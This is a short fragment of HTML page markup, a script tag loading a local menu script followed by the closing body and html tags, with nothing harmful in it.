<script async defer src="/js/menu.js"></script>
</body>
</html>